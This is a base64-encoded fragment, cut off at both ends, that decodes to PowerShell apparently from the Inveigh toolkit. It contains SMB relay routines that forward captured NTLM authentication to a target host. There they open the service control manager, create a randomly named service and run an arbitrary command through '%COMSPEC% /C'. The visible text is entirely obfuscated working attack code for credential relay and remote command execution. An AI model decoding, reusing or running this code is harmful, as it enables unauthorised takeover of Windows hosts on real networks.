uZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICBbQXJyYXldOjpSZXZlcnNlKCRTTUJfbGVuZ3RoXzEpCiAgICAgICAgW0FycmF5XTo6UmV2ZXJzZSgkU01CX2xlbmd0aF8yKQogICAgICAgIFtBcnJheV06OlJldmVyc2UoJFNNQl9sZW5ndGhfMykKICAgICAgICBbQXJyYXldOjpSZXZlcnNlKCRTTUJfTlRMTVNTUF9sZW5ndGgpCiAgICAgICAgW0FycmF5XTo6UmV2ZXJzZSgkU01CX25ldGJpb3NfbGVuZ3RoKQogICAgICAgICRqID0gMAogICAgICAgIAogICAgICAgIDpTTUJfcmVsYXlfcmVzcG9uc2VfbG9vcCB3aGlsZSAoJGogLWx0IDEpCiAgICAgICAgewogICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3NlbmQgPSAweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmZiwweDUzLDB4NGQsMHg0MiwweDczLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDAxLDB4NDgsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3VzZXJfSUQgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwYywweGZmLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweDAyLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NCwweDAwLDB4MDAsMHg4MCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfYnl0ZV9jb3VudCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YTEsMHg4MiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbGVuZ3RoXzEgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDMwLDB4ODIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8yICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhMiwweDgyICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9sZW5ndGhfMyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDQsMHg4MiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXF1ZXN0X2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1NSwweDZlLDB4NjksMHg3OCwweDAwLDB4NTMsMHg2MSwweDZkLDB4NjIsMHg2MSwweDAwCgogICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbS5Xcml0ZSgkU01CX3JlbGF5X3Jlc3BvbnNlX3NlbmQsMCwkU01CX3JlbGF5X3Jlc3BvbnNlX3NlbmQuTGVuZ3RoKQogICAgICAgIAkkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkU01CUmVsYXlOZXR3b3JrVGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV90aW1lb3V0ID0gTmV3LVRpbWVzcGFuIC1TZWNvbmRzICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0b3B3YXRjaCA9IFtTdXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2hpbGUoISRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLkRhdGFBdmFpbGFibGUpCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RvcHdhdGNoLkVsYXBzZWQgLWdlICRTTUJfcmVsYXlfcmVzcG9uc2VfdGltZW91dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHRhcmdldCBkaWRuJ3QgcmVzcG9uZCB3aXRoaW4gJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQgc2Vjb25kcyIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIDpTTUJfcmVsYXlfcmVzcG9uc2VfbG9vcAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CgogICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbS5SZWFkKCRTTUJfcmVsYXlfcmVzcG9uc2VfYnl0ZXMsMCwkU01CX3JlbGF5X3Jlc3BvbnNlX2J5dGVzLkxlbmd0aCkKICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMgogICAgICAgICAgICAkaisrCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJFNNQl9yZWxheV9yZXNwb25zZV9ieXRlcwogICAgfQoKfQoKIyBTTUIgUmVsYXkgRXhlY3V0ZSBTY3JpcHRCbG9jayAtIGV4ZWN1dGVzIGNvbW1hbmQgd2l0aGluIGF1dGhlbnRpY2F0ZWQgU01CIHNlc3Npb24KJFNNQl9yZWxheV9leGVjdXRlX3NjcmlwdGJsb2NrID0KewogICAgZnVuY3Rpb24gU01CUmVsYXlFeGVjdXRlCiAgICB7CiAgICAgICAgcGFyYW0gKCRTTUJfcmVsYXlfc29ja2V0LCRTTUJfdXNlcl9JRCkKICAgIAogICAgICAgIGlmICgkU01CX3JlbGF5X3NvY2tldCkKICAgICAgICB7CiAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0gPSAkU01CX3JlbGF5X3NvY2tldC5HZXRTdHJlYW0oKQogICAgICAgIH0KCiAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkZmFsc2UKICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNAogICAgICAgICRTTUJfc2VydmljZV9yYW5kb20gPSBbU3RyaW5nXTo6Sm9pbigiMDAtIiwoMS4uMjAgfCBGb3JFYWNoLU9iamVjdHsiezA6WDJ9LSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gNjUgLU1heGltdW0gOTApfSkpCiAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlX3JhbmRvbSAtcmVwbGFjZSAiLTAwIiwiIgogICAgICAgICRTTUJfc2VydmljZSA9ICRTTUJfc2VydmljZS5TdWJzdHJpbmcoMCwkU01CX3NlcnZpY2UuTGVuZ3RoIC0gMSkKICAgICAgICAkU01CX3NlcnZpY2UgPSAkU01CX3NlcnZpY2UuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfc2VydmljZSA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJFNNQl9zZXJ2aWNlLDAsJFNNQl9zZXJ2aWNlLkxlbmd0aCkKICAgICAgICAkU01CX3NlcnZpY2VfcmFuZG9tICs9ICcwMC0wMC0wMCcKICAgICAgICBbQnl0ZVtdXSAkU01CX3NlcnZpY2VfYnl0ZXMgPSAkU01CX3NlcnZpY2VfcmFuZG9tLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX3JlZmVyZW50X0lEX2J5dGVzID0gW1N0cmluZ10oMS4uNCB8IEZvckVhY2gtT2JqZWN0IHsiezA6WDJ9IiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDI1NSl9KQogICAgICAgICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMgPSAkU01CX3JlZmVyZW50X0lEX2J5dGVzLlNwbGl0KCIgIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAkU01CUmVsYXlDb21tYW5kID0gIiVDT01TUEVDJSAvQyBgIiIgKyAkU01CUmVsYXlDb21tYW5kICsgImAiIgogICAgICAgIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJFNNQlJlbGF5Q29tbWFuZCkgfCBGb3JFYWNoLU9iamVjdHskU01CX3JlbGF5X2NvbW1hbmQgKz0gInswOlgyfS0wMC0iIC1mICRffQoKICAgICAgICBpZihbQm9vbF0oJFNNQlJlbGF5Q29tbWFuZC5MZW5ndGggJSAyKSkKICAgICAgICB7CiAgICAgICAgICAgICRTTUJfcmVsYXlfY29tbWFuZCArPSAnMDAtMDAnCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRTTUJfcmVsYXlfY29tbWFuZCArPSAnMDAtMDAtMDAtMDAnCiAgICAgICAgfSAgICAKICAgICAgICAKICAgICAgICBbQnl0ZVtdXSAkU01CX3JlbGF5X2NvbW1hbmRfYnl0ZXMgPSAkU01CX3JlbGF5X2NvbW1hbmQuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfc2VydmljZV9kYXRhX2xlbmd0aF9ieXRlcyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzLkxlbmd0aCArICRTTUJfc2VydmljZV9ieXRlcy5MZW5ndGggKyAyMzcpCiAgICAgICAgJFNNQl9zZXJ2aWNlX2RhdGFfbGVuZ3RoX2J5dGVzID0gJFNNQl9zZXJ2aWNlX2RhdGFfbGVuZ3RoX2J5dGVzWzIuLjBdCiAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTTUJfcmVsYXlfY29tbWFuZF9ieXRlcy5MZW5ndGggKyAkU01CX3NlcnZpY2VfYnl0ZXMuTGVuZ3RoICsgMTc0KQogICAgICAgICRTTUJfc2VydmljZV9ieXRlX2NvdW50X2J5dGVzID0gJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXNbMC4uMV0gICAKICAgICAgICAkU01CX3JlbGF5X2NvbW1hbmRfbGVuZ3RoX2J5dGVzID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3JlbGF5X2NvbW1hbmRfYnl0ZXMuTGVuZ3RoIC8gMikKICAgICAgICAkayA9IDAKCiAgICAgICAgOlNNQl9yZWxheV9leGVjdXRlX2xvb3Agd2hpbGUgKCRrIC1sdCAxMikKICAgICAgICB7CgogICAgICAgICAgICBzd2l0Y2ggKCRrKQogICAgICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gMHgwMCwweDAwLDB4MDAsMHg0NSwweGZmLDB4NTMsMHg0ZCwweDQyLDB4NzUsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwMSwweDQ4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHhmZiwweGZmICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl91c2VyX0lEICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDA0LDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDFhLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4NWMsMHg1YywweDMxLDB4MzAsMHgyZSwweDMxLDB4MzAsMHgyZSwweDMyLDB4MmUsMHgzMSwweDMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgzMiwweDVjLDB4NDksMHg1MCwweDQzLDB4MjQsMHgwMCwweDNmLDB4M2YsMHgzZiwweDNmLDB4M2YsMHgwMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDEKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9IDB4MDAsMHgwMCwweDAwLDB4NWIsMHhmZiwweDUzLDB4NGQsMHg0MiwweGEyLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDIsMHgyOCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwOCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4MDAsMHgxOCwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwNywweDAwLDB4MTYsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA3LDB4MDAsMHgwMCwweDAwLDB4MDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDVjLDB4NzMsMHg3NiwweDYzLDB4NjMsMHg3NCwweDZjLDB4MDAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMgogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gMHgwMCwweDAwLDB4MDAsMHg4NywweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwNSwweDI4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDA4ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl91c2VyX0lEICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDQsMHgwMCwweDBlLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4ZWEsMHgwMywweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDgsMHgwMCwweDQ4LDB4MDAsMHgwMCwweDAwLDB4NDgsMHgwMCwweDNmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDgsMHgwMCwweDA1LDB4MDAsMHgwYiwweDAzLDB4MTAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDQ4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhkMCwweDE2LDB4ZDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE2LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MSwweGJiLDB4N2EsMHgzNiwweDQ0LDB4OTgsMHhmMSwweDM1LDB4YWQsMHgzMiwweDk4LDB4ZjAsMHgzOCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgxMCwweDAzLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwNCwweDVkLDB4ODgsMHg4YSwweGViLDB4MWMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGM5LDB4MTEsMHg5ZiwweGU4LDB4MDgsMHgwMCwweDJiLDB4MTAsMHg0OCwweDYwLDB4MDIsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAkU01CX211bHRpcGxleF9pZCA9IDB4MDUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAzCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDQKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9IDB4MDAsMHgwMCwweDAwLDB4OWIsMHhmZiwweDUzLDB4NGQsMHg0MiwweDJmLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDUsMHgyOCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwOCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDA2LDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweGVhLDB4MDMsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmZiwweGZmLDB4ZmYsMHhmZiwweDA4LDB4MDAsMHg1MCwweDAwLDB4MDAsMHgwMCwweDVjLDB4MDAsMHgzZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDVjLDB4MDAsMHgwNSwweDAwLDB4MDAsMHgwMywweDEwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHg1YywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MzgsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwZiwweDAwLDB4MDAsMHgwMCwweDAzLDB4MDAsMHgxNSwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxNSwweDAwLDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgzZiwweDAwLDB4MGYsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAkU01CX211bHRpcGxleF9pZCA9IDB4MDcKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgNQogICAgICAgICAgICAgICAgeyAgCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAkU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgNgogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gW0FycmF5XSAweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2VydmljZV9kYXRhX2xlbmd0aF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDUsMHgyOCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwOCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDA4LDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmZiwweGZmLDB4ZmYsMHhmZiwweDA4LDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2VydmljZV9ieXRlX2NvdW50X2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4M2YsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2VydmljZV9ieXRlX2NvdW50X2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDUsMHgwMCwweDAwLDB4MDMsMHgxMCwweDAwLDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDBjLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NvbnRleHRfaGFuZGxlciArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE1LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxNSwweDAwLDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxNSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTUsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweGZmLDB4MDEsMHgwZiwweDAwLDB4MTAsMHgwMSwweDAwLDB4MDAsMHgwMywweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC